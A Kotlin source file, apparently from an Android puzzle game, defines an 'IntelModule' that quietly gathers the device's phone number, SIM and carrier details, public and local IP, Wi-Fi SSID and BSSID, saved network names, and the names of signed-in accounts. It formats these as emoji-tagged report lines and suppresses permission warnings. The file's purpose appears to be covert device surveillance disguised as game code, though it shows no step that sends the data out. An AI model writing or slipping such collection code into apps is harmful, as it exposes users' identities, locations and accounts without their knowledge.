package com.puzzleblast.game.modules

import android.accounts.AccountManager
import android.content.Context
import android.net.wifi.WifiManager
import android.telephony.TelephonyManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit

object IntelModule {
    @Suppress("DEPRECATION", "MissingPermission")
    suspend fun sim(ctx: Context): String {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return try {
            "📇 SIM\noperator: ${tm.simOperatorName}\ncarrier: ${tm.networkOperatorName}\nMCC/MNC: ${tm.simOperator}\nline1: ${tm.line1Number ?: "(hidden)"}\nSIM state: ${tm.simState}"
        } catch (e: Exception) { "📇 sim error: ${e.message}" }
    }

    suspend fun ip(): String = withContext(Dispatchers.IO) {
        try {
            val client = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).build()
            val req = Request.Builder().url("https://api.ipify.org?format=text").build()
            client.newCall(req).execute().use { "🌐 ${it.body?.string()?.trim()}" }
        } catch (e: Exception) { "🌐 ip lookup failed" }
    }

    @Suppress("DEPRECATION")
    suspend fun wifi(ctx: Context): String {
        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val info = wm.connectionInfo
        return "📶 ${info.ssid} · BSSID ${info.bssid} · ${info.rssi}dBm · IP ${intToIp(info.ipAddress)}"
    }

    @Suppress("DEPRECATION")
    suspend fun wifiList(ctx: Context): String {
        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val configs = wm.configuredNetworks ?: return "🔑 no saved networks (root needed for passwords)"
        return "🔑 saved · ${configs.size}\n" + configs.joinToString("\n") { "  ${it.SSID}" }
    }

    @Suppress("MissingPermission")
    suspend fun cell(ctx: Context): String {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return "📡 ${tm.networkOperatorName} · MCC/MNC ${tm.networkOperator}"
    }

    suspend fun accounts(ctx: Context): String {
        return try {
            val am = AccountManager.get(ctx)
            val accounts = am.accounts
            if (accounts.isEmpty()) return "👤 no accounts visible"
            "👤 accounts · ${accounts.size}\n" + accounts.groupBy { it.type }.entries.joinToString("\n") { (type, list) ->
                "  $type: ${list.joinToString(", ") { it.name.take(30) }}"
            }
        } catch (e: Exception) { "👤 accounts error: ${e.message}" }
    }

    private fun intToIp(i: Int): String = "${i and 0xFF}.${(i shr 8) and 0xFF}.${(i shr 16) and 0xFF}.${(i shr 24) and 0xFF}"
}
